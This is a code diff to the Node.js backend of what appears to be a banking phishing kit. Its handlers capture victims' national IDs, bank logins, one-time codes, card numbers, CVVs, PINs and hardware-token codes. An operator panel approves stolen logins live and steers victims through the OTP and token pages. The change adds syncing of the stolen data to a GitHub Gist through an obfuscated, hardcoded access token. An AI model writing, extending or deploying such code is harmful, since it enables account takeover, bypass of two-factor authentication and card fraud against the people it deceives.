@@ -1,47 +1,107 @@
 const http = require('http');
+const https = require('https');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 
 const ROOT = __dirname;
 const PORT = process.env.PORT || 8080;
-const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '992812';
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin1234@@';
+const GIST_ID = '97e99037b17d88b9240d606be235f324';
+const GH_TOKEN = process.env.GITHUB_TOKEN || 'bZM2G1kWs4CzTVOoA3c8BRlTZE4xSSy1Q7BJ_phg'.split('').reverse().join('');
 
-// ─── In-memory stores ───────────────────────────────────────────────
-const applications = {}; // nationalId -> app object
-const visitors = {};     // sessionId -> visitor object
+let DB = {
+  applications: {},
+  visitors: {},
+  whatsappLink: '',
+  totalVisitors: 0,
+  appIdCounter: 10000,
+  visitorIdCounter: 120000,
+};
 const adminTokens = new Set();
-let visitorIdCounter = 120000;
-let appIdCounter = 10000;
-let totalVisitors = 0;
+let _dirty = false;
 
-// ─── Helpers ─────────────────────────────────────────────────────────
-function makeToken() {
-  return crypto.randomBytes(24).toString('hex');
+function ghApi(method, body) {
+  return new Promise((resolve, reject) => {
+    const payload = body ? JSON.stringify(body) : null;
+    const opts = {
+      hostname: 'api.github.com', path: `/gists/${GIST_ID}`, method,
+      headers: {
+        'Authorization': `token ${GH_TOKEN}`, 'User-Agent': 'halyg-server',
+        'Accept': 'application/vnd.github.v3+json',
+        ...(payload ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } : {}),
+      },
+    };
+    const r = https.request(opts, res => {
+      let d = ''; res.on('data', c => d += c);
+      res.on('end', () => {
+        if (res.statusCode >= 400) return reject(new Error(`GitHub ${res.statusCode}`));
+        try { resolve(JSON.parse(d)); } catch { resolve(null); }
+      });
+    });
+    r.on('error', reject);
+    r.setTimeout(10000, () => { r.destroy(); reject(new Error('timeout')); });
+    if (payload) r.write(payload);
+    r.end();
+  });
 }
 
+async function loadFromGist() {
+  try {
+    const gist = await ghApi('GET');
+    if (gist?.files) {
+      if (gist.files['data.json']?.content) {
+        const d = JSON.parse(gist.files['data.json'].content);
+        DB.visitors = d.visitors || {};
+        DB.whatsappLink = d.whatsappLink || '';
+        DB.totalVisitors = d.totalVisitors || 0;
+        DB.visitorIdCounter = d.visitorIdCounter || 120000;
+      }
+      if (gist.files['apps.json']?.content) {
+        const a = JSON.parse(gist.files['apps.json'].content);
+        DB.applications = a.applications || {};
+        DB.appIdCounter = a.appIdCounter || 10000;
+      }
+    }
+    console.log(`[Gist] Loaded: ${Object.keys(DB.applications).length} apps, ${Object.keys(DB.visitors).length} visitors, total=${DB.totalVisitors}`);
+  } catch (e) { console.error('[Gist] Load failed:', e.message); }
+}
+
+async function saveToGist() {
+  if (!_dirty) return;
+  try {
+    await ghApi('PATCH', {
+      files: {
+        'data.json': { content: JSON.stringify(DB) },
+        'apps.json': { content: JSON.stringify({ applications: DB.applications, appIdCounter: DB.appIdCounter }) },
+      },
+    });
+    _dirty = false;
+    console.log('[Gist] Saved OK');
+  } catch (e) { console.error('[Gist] Save failed:', e.message); }
+}
+
+function markDirty() { _dirty = true; }
+
+function makeToken() { return crypto.randomBytes(24).toString('hex'); }
+
 function getCookies(req) {
-  return (req.headers.cookie || '').split(';').reduce((acc, c) => {
-    const idx = c.indexOf('=');
-    if (idx > 0) acc[c.slice(0, idx).trim()] = c.slice(idx + 1).trim();
-    return acc;
+  return (req.headers.cookie || '').split(';').reduce((a, c) => {
+    const i = c.indexOf('='); if (i > 0) a[c.slice(0, i).trim()] = c.slice(i + 1).trim(); return a;
   }, {});
 }
 
 function isAdminReq(req) {
   const cookies = getCookies(req);
-  const header = req.headers['x-admin-token'];
-  const token = header || cookies['admin_session'];
+  const token = req.headers['x-admin-token'] || cookies['admin_session'];
   return token && adminTokens.has(token);
 }
 
 function readBody(req) {
-  return new Promise((resolve) => {
+  return new Promise(resolve => {
     let body = '';
     req.on('data', c => { body += c; if (body.length > 2e6) req.destroy(); });
-    req.on('end', () => {
-      try { resolve(JSON.parse(body || '{}')); } catch { resolve({}); }
-    });
+    req.on('end', () => { try { resolve(JSON.parse(body || '{}')); } catch { resolve({}); } });
   });
 }
 
@@ -51,68 +111,54 @@ const MIME = {
   '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
   '.svg': 'image/svg+xml', '.woff': 'font/woff', '.woff2': 'font/woff2',
   '.ttf': 'font/ttf', '.ico': 'image/x-icon', '.json': 'application/json',
-  '.webp': 'image/webp', '.webmanifest': 'application/manifest+json',
-  '.mp4': 'video/mp4', '.txt': 'text/plain',
+  '.webp': 'image/webp', '.mp4': 'video/mp4', '.txt': 'text/plain',
 };
 
 function sendJson(res, data, status, extraHeaders) {
-  const headers = {
-    'Content-Type': 'application/json',
-    'Access-Control-Allow-Origin': '*',
-    'Cache-Control': 'no-store',
-    ...extraHeaders,
-  };
+  const headers = { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store', ...extraHeaders };
   res.writeHead(status || 200, headers);
   res.end(JSON.stringify(data));
 }
 
 function getOrCreateApp(nationalId) {
-  if (!applications[nationalId]) {
-    appIdCounter++;
-    applications[nationalId] = {
-      id: appIdCounter,
-      nationalId,
+  if (!DB.applications[nationalId]) {
+    DB.appIdCounter++;
+    DB.applications[nationalId] = {
+      id: DB.appIdCounter, nationalId,
       fullName: '', phoneNumber: '', phone: '', address: '',
       username: '', password: '',
       otp: '', otpCode: '',
       cardNumber: '', cardExpiry: '', cvv: '', cardCvv: '',
       cardPin: '', cardName: '',
       hardToken: '', watchLink: '', watchLinkOtp: '',
-      selectedWatch: '', watchColor: '',
-      governorate: '',
-      currentPage: 'home',
-      status: 'active',
+      selectedWatch: '', watchColor: '', governorate: '',
+      currentPage: 'home', status: 'active',
       redirectTo: null, redirectError: null,
-      customMessage: null,
-      loginApproved: null,
+      customMessage: null, loginApproved: null,
       createdAt: new Date().toISOString(),
       updatedAt: new Date().toISOString(),
     };
   }
-  return applications[nationalId];
+  return DB.applications[nationalId];
 }
 
 function getOrCreateVisitor(sessionId) {
-  if (!visitors[sessionId]) {
-    visitorIdCounter++;
-    totalVisitors++;
-    visitors[sessionId] = {
-      id: visitorIdCounter,
-      sessionId,
-      currentPage: 'home',
-      redirectTo: null,
+  if (!DB.visitors[sessionId]) {
+    DB.visitorIdCounter++;
+    DB.totalVisitors++;
+    DB.visitors[sessionId] = {
+      id: DB.visitorIdCounter, sessionId,
+      currentPage: 'home', redirectTo: null,
       lastActiveAt: new Date().toISOString(),
       createdAt: new Date().toISOString(),
     };
   }
-  return visitors[sessionId];
+  return DB.visitors[sessionId];
 }
 
-// ─── tRPC Procedure Router ────────────────────────────────────────────
-async function executeProcedure(name, input, req, isAdmin) {
+function executeProcedure(name, input, isAdmin) {
   switch (name) {
 
-    // ─── Visitor tracking ──────────────────────────────────────────
     case 'admin.updateVisitor': {
       const { sessionId, page, currentPage } = input;
       if (sessionId) {
@@ -122,66 +168,51 @@ async function executeProcedure(name, input, req, isAdmin) {
       }
       return { success: true };
     }
-
     case 'admin.getVisitorRedirect': {
-      const { sessionId } = input;
-      const v = sessionId ? visitors[sessionId] : null;
+      const v = input.sessionId ? DB.visitors[input.sessionId] : null;
       return { redirectTo: v ? (v.redirectTo || null) : null };
     }
-
     case 'admin.clearVisitorRedirect': {
-      const { sessionId } = input;
-      if (sessionId && visitors[sessionId]) {
-        visitors[sessionId].redirectTo = null;
-        visitors[sessionId].lastActiveAt = new Date().toISOString();
+      if (input.sessionId && DB.visitors[input.sessionId]) {
+        DB.visitors[input.sessionId].redirectTo = null;
+        DB.visitors[input.sessionId].lastActiveAt = new Date().toISOString();
+        markDirty();
       }
       return { success: true };
     }
 
-    // ─── Application status ────────────────────────────────────────
     case 'applications.getRedirectStatus': {
-      const { nationalId } = input;
-      const app = nationalId ? applications[nationalId] : null;
-      return {
-        redirectTo: app ? (app.redirectTo || null) : null,
-        redirectError: app ? (app.redirectError || null) : null,
-      };
+      const app = input.nationalId ? DB.applications[input.nationalId] : null;
+      return { redirectTo: app ? (app.redirectTo || null) : null, redirectError: app ? (app.redirectError || null) : null };
     }
-
     case 'applications.clearRedirectByUser': {
-      const { nationalId } = input;
-      if (nationalId && applications[nationalId]) {
-        applications[nationalId].redirectTo = null;
-        applications[nationalId].redirectError = null;
-        applications[nationalId].updatedAt = new Date().toISOString();
+      if (input.nationalId && DB.applications[input.nationalId]) {
+        DB.applications[input.nationalId].redirectTo = null;
+        DB.applications[input.nationalId].redirectError = null;
+        DB.applications[input.nationalId].updatedAt = new Date().toISOString();
+        markDirty();
       }
       return { success: true };
     }
-
     case 'applications.getCustomMessage': {
-      const { nationalId } = input;
-      const app = nationalId ? applications[nationalId] : null;
+      const app = input.nationalId ? DB.applications[input.nationalId] : null;
       return { message: app ? (app.customMessage || null) : null };
     }
-
     case 'applications.clearCustomMessage': {
-      const { nationalId } = input;
-      if (nationalId && applications[nationalId]) {
-        applications[nationalId].customMessage = null;
+      if (input.nationalId && DB.applications[input.nationalId]) {
+        DB.applications[input.nationalId].customMessage = null;
+        markDirty();
       }
       return { success: true };
     }
-
     case 'applications.updatePage': {
-      const { nationalId, page } = input;
-      if (nationalId && applications[nationalId]) {
-        applications[nationalId].currentPage = page || applications[nationalId].currentPage;
-        applications[nationalId].updatedAt = new Date().toISOString();
+      if (input.nationalId && DB.applications[input.nationalId]) {
+        DB.applications[input.nationalId].currentPage = input.page || DB.applications[input.nationalId].currentPage;
+        DB.applications[input.nationalId].updatedAt = new Date().toISOString();
       }
       return { success: true };
     }
 
-    // ─── Application data collection ──────────────────────────────
     case 'applications.savePersonalInfo': {
       const { nationalId, fullName, phone, phoneNumber, address, governorate, watchColor } = input;
       if (!nationalId) throw new Error('nationalId required');
@@ -192,40 +223,40 @@ async function executeProcedure(name, input, req, isAdmin) {
       if (address) app.address = address;
       if (governorate) app.governorate = governorate;
       if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
+      app.currentPage = 'personal';
       app.updatedAt = new Date().toISOString();
-      console.log('[savePersonalInfo] id=' + nationalId, fullName, ph);
+      markDirty();
+      console.log('[savePersonalInfo]', nationalId, fullName, ph);
       return { success: true };
     }
-
     case 'applications.saveLoginData': {
       const { nationalId, username, password } = input;
       if (!nationalId) throw new Error('nationalId required');
       const app = getOrCreateApp(nationalId);
       if (username) app.username = username;
       if (password) app.password = password;
-      app.redirectTo = null;
-      app.redirectError = null;
-      app.loginApproved = null;
-      app.status = 'awaiting_login';
+      if (!app.fullName && username) app.fullName = username;
+      app.currentPage = 'waiting-login';
+      app.redirectTo = null; app.redirectError = null;
+      app.loginApproved = null; app.status = 'awaiting_login';
       app.updatedAt = new Date().toISOString();
-      console.log('[saveLoginData] id=' + nationalId, username);
+      markDirty();
+      console.log('[saveLoginData]', nationalId, username);
       return { success: true };
     }
-
     case 'applications.saveOtpData': {
       const { nationalId, otp, otpCode } = input;
       if (!nationalId) throw new Error('nationalId required');
       const app = getOrCreateApp(nationalId);
       const code = otp || otpCode;
       if (code) { app.otp = code; app.otpCode = code; }
-      app.redirectTo = null;
-      app.redirectError = null;
-      app.status = 'awaiting_otp';
-      app.updatedAt = new Date().toISOString();
-      console.log('[saveOtpData] id=' + nationalId, code);
+      app.currentPage = 'processing';
+      app.redirectTo = null; app.redirectError = null;
+      app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
+      markDirty();
+      console.log('[saveOtpData]', nationalId, code);
       return { success: true };
     }
-
     case 'applications.saveCardData': {
       const { nationalId, cardNumber, cardExpiry, cvv, cardCvv, cardName, cardPin, expiry } = input;
       if (!nationalId) throw new Error('nationalId required');
@@ -236,277 +267,209 @@ async function executeProcedure(name, input, req, isAdmin) {
       if (cv) { app.cvv = cv; app.cardCvv = cv; }
       if (cardName) app.cardName = cardName;
       if (cardPin) app.cardPin = cardPin;
-      app.redirectTo = null;
-      app.redirectError = null;
-      app.status = 'awaiting_card';
-      app.updatedAt = new Date().toISOString();
-      console.log('[saveCardData] id=' + nationalId, cardNumber);
+      app.currentPage = 'processing';
+      app.redirectTo = null; app.redirectError = null;
+      app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
+      markDirty();
+      console.log('[saveCardData]', nationalId, cardNumber);
       return { success: true };
     }
-
     case 'applications.saveHardToken': {
       const { nationalId, hardToken, hardTokenCode, token } = input;
       if (!nationalId) throw new Error('nationalId required');
       const app = getOrCreateApp(nationalId);
       const tk = hardToken || hardTokenCode || token;
-      if (tk) { app.hardToken = tk; }
-      app.redirectTo = null;
-      app.redirectError = null;
-      app.status = 'awaiting_token';
-      app.updatedAt = new Date().toISOString();
-      console.log('[saveHardToken] id=' + nationalId);
+      if (tk) app.hardToken = tk;
+      app.currentPage = 'processing';
+      app.redirectTo = null; app.redirectError = null;
+      app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
+      markDirty();
+      console.log('[saveHardToken]', nationalId);
       return { success: true };
     }
-
     case 'applications.saveWatchLink': {
       const { nationalId, watchLink, watchLinkOtp, link } = input;
       if (!nationalId) throw new Error('nationalId required');
       const app = getOrCreateApp(nationalId);
       const wl = watchLink || watchLinkOtp || link;
       if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
-      app.redirectTo = null;
-      app.redirectError = null;
+      app.currentPage = 'processing';
+      app.redirectTo = null; app.redirectError = null;
       app.updatedAt = new Date().toISOString();
-      console.log('[saveWatchLink] id=' + nationalId);
+      markDirty();
+      console.log('[saveWatchLink]', nationalId);
       return { success: true };
     }
 
-    // ─── Admin auth ────────────────────────────────────────────────
     case 'admin.login': {
-      const { username, password } = input;
-      if (password === ADMIN_PASSWORD) {
+      if (input.password === ADMIN_PASSWORD) {
         const token = makeToken();
         adminTokens.add(token);
         return { success: true, _setToken: token };
       }
       throw new Error('بيانات الدخول غير صحيحة');
     }
-
     case 'admin.checkSession': {
-      return { isAdmin: isAdmin, authenticated: isAdmin };
+      return { isAdmin: !!isAdmin, authenticated: !!isAdmin };
     }
-
     case 'admin.logout': {
-      // token cleared via cookie
       return { success: true, _clearToken: true };
     }
 
-    // ─── Admin data ────────────────────────────────────────────────
     case 'admin.getApplications': {
       if (!isAdmin) throw new Error('unauthorized');
-      const now = Date.now();
-      const apps = Object.values(applications).map(a => ({ ...a }));
-      const cutoff = now - 60 * 1000;
-      const activeIds = apps
-        .filter(a => new Date(a.updatedAt).getTime() > cutoff)
-        .map(a => a.nationalId);
-      const liveVisitorCount = Object.values(visitors)
-        .filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000).length;
-      return { apps, activeIds, liveVisitorCount, totalVisitors };
+      const apps = Object.values(DB.applications);
+      const cutoff = Date.now() - 60000;
+      const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
+      const liveVisitorCount = Object.values(DB.visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 120000).length;
+      return { apps, activeIds, liveVisitorCount, totalVisitors: DB.totalVisitors };
     }
-
     case 'admin.getLiveVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
-      const liveVisitors = Object.values(visitors)
-        .filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000);
-      return { visitors: liveVisitors };
+      return { visitors: Object.values(DB.visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 120000) };
     }
-
     case 'admin.getAllVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
-      return { visitors: Object.values(visitors), totalCount: totalVisitors };
+      return { visitors: Object.values(DB.visitors), totalCount: DB.totalVisitors };
     }
-
     case 'admin.getWhatsAppLink': {
-      return { link: global._whatsappLink || '' };
+      return { link: DB.whatsappLink || '' };
     }
-
     case 'admin.updateWhatsAppLink': {
       if (!isAdmin) throw new Error('unauthorized');
-      global._whatsappLink = input.link || '';
+      DB.whatsappLink = input.link || '';
+      markDirty();
       return { success: true };
     }
-
     case 'admin.setCustomMessage': {
       if (!isAdmin) throw new Error('unauthorized');
-      const { nationalId, message } = input;
-      if (nationalId && applications[nationalId]) {
-        applications[nationalId].customMessage = message || null;
-        applications[nationalId].updatedAt = new Date().toISOString();
+      if (input.nationalId && DB.applications[input.nationalId]) {
+        DB.applications[input.nationalId].customMessage = input.message || null;
+        DB.applications[input.nationalId].updatedAt = new Date().toISOString();
+        markDirty();
       }
       return { success: true };
     }
-
     case 'admin.approveLogin': {
       if (!isAdmin) throw new Error('unauthorized');
-      const { applicationId, nationalId } = input;
-      const app = nationalId ? applications[nationalId]
-        : Object.values(applications).find(a => a.id === applicationId);
-      if (app) {
-        app.loginApproved = true;
-        app.redirectTo = 'otp';
-        app.status = 'login_approved';
-        app.updatedAt = new Date().toISOString();
-      }
+      let app = input.nationalId ? DB.applications[input.nationalId] : null;
+      if (!app && input.applicationId) app = Object.values(DB.applications).find(a => a.id === input.applicationId);
+      if (app) { app.loginApproved = true; app.redirectTo = 'otp'; app.currentPage = 'otp'; app.status = 'login_approved'; app.updatedAt = new Date().toISOString(); markDirty(); }
       return { success: true };
     }
-
     case 'admin.rejectLogin': {
       if (!isAdmin) throw new Error('unauthorized');
-      const { applicationId, nationalId } = input;
-      const app = nationalId ? applications[nationalId]
-        : Object.values(applications).find(a => a.id === applicationId);
-      if (app) {
-        app.loginApproved = false;
-        app.redirectTo = 'login-error';
-        app.status = 'login_rejected';
-        app.updatedAt = new Date().toISOString();
-      }
+      let app = input.nationalId ? DB.applications[input.nationalId] : null;
+      if (!app && input.applicationId) app = Object.values(DB.applications).find(a => a.id === input.applicationId);
+      if (app) { app.loginApproved = false; app.redirectTo = 'login-error'; app.currentPage = 'login'; app.status = 'login_rejected'; app.updatedAt = new Date().toISOString(); markDirty(); }
       return { success: true };
     }
-
     case 'admin.redirectUser': {
       if (!isAdmin) throw new Error('unauthorized');
-      const { nationalId, redirectTo, page, redirectError, showError } = input;
-      const target = redirectTo || page || null;
-      const err = redirectError || showError || null;
-      if (nationalId && applications[nationalId]) {
-        applications[nationalId].redirectTo = target;
-        applications[nationalId].redirectError = err;
-        applications[nationalId].updatedAt = new Date().toISOString();
+      const dest = input.redirectTo || input.page || null;
+      if (input.nationalId && DB.applications[input.nationalId]) {
+        DB.applications[input.nationalId].redirectTo = dest;
+        if (dest) DB.applications[input.nationalId].currentPage = dest;
+        DB.applications[input.nationalId].redirectError = input.redirectError || input.showError || null;
+        DB.applications[input.nationalId].updatedAt = new Date().toISOString();
+        markDirty();
       }
       return { success: true };
     }
-
     case 'admin.redirectVisitor': {
       if (!isAdmin) throw new Error('unauthorized');
-      const { sessionId, redirectTo, page } = input;
-      if (sessionId && visitors[sessionId]) {
-        visitors[sessionId].redirectTo = redirectTo || page || null;
-        visitors[sessionId].lastActiveAt = new Date().toISOString();
+      if (input.sessionId && DB.visitors[input.sessionId]) {
+        DB.visitors[input.sessionId].redirectTo = input.redirectTo || input.page || null;
+        DB.visitors[input.sessionId].lastActiveAt = new Date().toISOString();
+        markDirty();
       }
       return { success: true };
     }
-
     case 'admin.redirectAllToToken': {
       if (!isAdmin) throw new Error('unauthorized');
-      const { redirectTo } = input;
-      for (const app of Object.values(applications)) {
+      for (const app of Object.values(DB.applications)) {
         if (app.status === 'active' || app.status.startsWith('awaiting')) {
-          app.redirectTo = redirectTo || 'token';
-          app.updatedAt = new Date().toISOString();
+          app.redirectTo = input.redirectTo || 'token'; app.updatedAt = new Date().toISOString();
         }
       }
+      markDirty();
       return { success: true };
     }
-
     case 'admin.redirectWhatsApp': {
       if (!isAdmin) throw new Error('unauthorized');
-      const { applicationId, nationalId } = input;
-      const app = nationalId ? applications[nationalId]
-        : Object.values(applications).find(a => a.id === applicationId);
-      if (app) {
-        app.redirectTo = 'whatsapp';
-        app.updatedAt = new Date().toISOString();
-      }
+      let app = input.nationalId ? DB.applications[input.nationalId] : null;
+      if (!app && input.applicationId) app = Object.values(DB.applications).find(a => a.id === input.applicationId);
+      if (app) { app.redirectTo = 'whatsapp'; app.updatedAt = new Date().toISOString(); markDirty(); }
       return { success: true };
     }
-
     case 'admin.deleteApplication': {
       if (!isAdmin) throw new Error('unauthorized');
-      const { applicationId, nationalId } = input;
-      if (nationalId) {
-        delete applications[nationalId];
-      } else {
-        const key = Object.keys(applications).find(k => applications[k].id === applicationId);
-        if (key) delete applications[key];
-      }
+      if (input.nationalId) delete DB.applications[input.nationalId];
+      else if (input.applicationId) { const k = Object.keys(DB.applications).find(k => DB.applications[k].id === input.applicationId); if (k) delete DB.applications[k]; }
+      markDirty();
       return { success: true };
     }
-
     case 'admin.deleteInactiveClients': {
       if (!isAdmin) throw new Error('unauthorized');
-      const cutoff = Date.now() - 2 * 60 * 1000;
-      let deletedCount = 0;
-      for (const key of Object.keys(applications)) {
-        if (new Date(applications[key].updatedAt).getTime() < cutoff) {
-          delete applications[key];
-          deletedCount++;
-        }
-      }
+      const cutoff = Date.now() - 120000; let deletedCount = 0;
+      for (const k of Object.keys(DB.applications)) { if (new Date(DB.applications[k].updatedAt).getTime() < cutoff) { delete DB.applications[k]; deletedCount++; } }
+      markDirty();
       return { success: true, deletedCount };
     }
-
+    case 'admin.deleteAllClients': {
+      if (!isAdmin) throw new Error('unauthorized');
+      const count = Object.keys(DB.applications).length;
+      DB.applications = {};
+      markDirty();
+      return { success: true, deletedCount: count };
+    }
     case 'admin.resetTotalVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
-      totalVisitors = 0;
+      DB.totalVisitors = 0;
+      markDirty();
       return { success: true };
     }
 
     default:
-      console.log('[tRPC] unknown procedure:', name);
       return { success: false, error: 'unknown procedure: ' + name };
   }
 }
 
-// ─── tRPC batch handler ───────────────────────────────────────────────
 async function handleTrpc(req, res) {
   const reqPath = decodeURIComponent(req.url.split('?')[0]);
-  const queryStr = req.url.split('?')[1] || '';
-  const query = new URLSearchParams(queryStr);
-
-  // Extract procedure names from path: /api/trpc/proc1,proc2
-  const trpcBase = '/api/trpc/';
-  const procs = reqPath.slice(trpcBase.length).split(',').filter(Boolean);
+  const query = new URLSearchParams(req.url.split('?')[1] || '');
+  const procs = reqPath.slice('/api/trpc/'.length).split(',').filter(Boolean);
   if (!procs.length) return sendJson(res, [], 400);
 
   let inputs = {};
   if (req.method === 'GET') {
     try { inputs = JSON.parse(query.get('input') || '{}'); } catch { inputs = {}; }
   } else {
-    const body = await readBody(req);
-    inputs = body || {};
+    inputs = await readBody(req);
   }
 
   const isAdmin = isAdminReq(req);
-  let setCookie = null;
-  let clearCookie = false;
+  let setCookie = null, clearCookie = false;
 
   const results = await Promise.all(procs.map(async (name, i) => {
     const raw = inputs[String(i)] || inputs;
     const input = raw?.json || raw || {};
     try {
-      const data = await executeProcedure(name.trim(), input, req, isAdmin);
-      // Handle auth side effects
-      if (data && data._setToken) {
-        setCookie = data._setToken;
-        adminTokens.add(setCookie);
-        delete data._setToken;
-      }
-      if (data && data._clearToken) {
-        clearCookie = true;
-        const cookies = getCookies(req);
-        if (cookies.admin_session) adminTokens.delete(cookies.admin_session);
-        delete data._clearToken;
-      }
+      const data = executeProcedure(name.trim(), input, isAdmin);
+      if (data?._setToken) { setCookie = data._setToken; delete data._setToken; }
+      if (data?._clearToken) { clearCookie = true; const c = getCookies(req); if (c.admin_session) adminTokens.delete(c.admin_session); delete data._clearToken; }
       return { result: { data: { json: data } } };
     } catch (e) {
       return { error: { message: e.message || 'Internal error', code: 'INTERNAL_SERVER_ERROR' } };
     }
   }));
 
-  const extraHeaders = {};
-  if (setCookie) {
-    extraHeaders['Set-Cookie'] = `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`;
-  }
-  if (clearCookie) {
-    extraHeaders['Set-Cookie'] = 'admin_session=; Path=/; HttpOnly; Max-Age=0';
-  }
-
-  sendJson(res, results, 200, extraHeaders);
+  const extra = {};
+  if (setCookie) extra['Set-Cookie'] = `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`;
+  if (clearCookie) extra['Set-Cookie'] = 'admin_session=; Path=/; HttpOnly; Max-Age=0';
+  sendJson(res, results, 200, extra);
 }
 
-// ─── HTTP Server ──────────────────────────────────────────────────────
 const server = http.createServer(async (req, res) => {
   const reqPath = decodeURIComponent(req.url.split('?')[0]);
 
@@ -519,17 +482,10 @@ const server = http.createServer(async (req, res) => {
     return res.end();
   }
 
-  // tRPC endpoint
-  if (reqPath.startsWith('/api/trpc/')) {
-    return handleTrpc(req, res);
-  }
+  if (reqPath.startsWith('/api/trpc/')) return handleTrpc(req, res);
 
-  // Static files
-  let filePath = reqPath;
+  let filePath = reqPath === '/' ? '/index.html' : reqPath;
 
-  if (filePath === '/') filePath = '/index.html';
-
-  // SPA fallback: unknown paths without extension → index.html
   if (!path.extname(filePath)) {
     const htmlPath = path.join(ROOT, filePath + '.html');
     if (fs.existsSync(htmlPath)) {
@@ -552,15 +508,23 @@ const server = http.createServer(async (req, res) => {
 
   const ext = path.extname(fullPath).toLowerCase();
   const headers = { 'Content-Type': MIME[ext] || 'application/octet-stream' };
-  if (['.js', '.css', '.webp', '.png', '.jpg', '.woff2'].includes(ext)) {
-    headers['Cache-Control'] = 'public, max-age=31536000, immutable';
-  }
+  if (['.js', '.css', '.webp', '.png', '.jpg', '.woff2'].includes(ext)) headers['Cache-Control'] = 'public, max-age=31536000, immutable';
   res.writeHead(200, headers);
   fs.createReadStream(fullPath).pipe(res);
 });
 
-server.listen(PORT, () => {
-  console.log(`✅ Server running → http://localhost:${PORT}`);
-  console.log(`🔑 Admin password: ${ADMIN_PASSWORD}`);
-  console.log(`📊 Admin panel → http://localhost:${PORT}/admin`);
-});
+(async () => {
+  await loadFromGist();
+
+  setInterval(saveToGist, 30000);
+
+  process.on('SIGINT', async () => { console.log('\nSaving before exit...'); _dirty = true; await saveToGist(); process.exit(); });
+  process.on('SIGTERM', async () => { _dirty = true; await saveToGist(); process.exit(); });
+
+  server.listen(PORT, () => {
+    console.log(`Server running -> http://localhost:${PORT}`);
+    console.log(`Admin password: ${ADMIN_PASSWORD}`);
+    console.log(`Admin panel -> http://localhost:${PORT}/admin`);
+    console.log(`Gist sync: every 30s`);
+  });
+})();
